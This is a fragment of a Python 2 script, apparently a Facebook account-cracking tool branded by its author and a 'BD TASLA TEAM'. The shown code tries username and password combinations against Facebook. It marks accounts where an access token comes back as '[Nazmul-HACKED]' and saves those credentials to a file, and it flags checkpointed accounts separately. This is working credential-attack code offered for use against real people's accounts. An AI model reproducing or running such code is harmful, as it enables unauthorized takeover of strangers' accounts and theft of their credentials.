...
#Tools Created By Nazmul Hossain 
#BD TASLA TEAM
#COPYRIGHT 2022
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : NAZMUL HOSSAIN'
    print '\033[0;94mFACEBOOK : NAZMUL HOSSAIN  '
    print '\033[0;96mGITHUB   : github.com/NazmulHossain1623'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Nazmul-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Nazmul-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
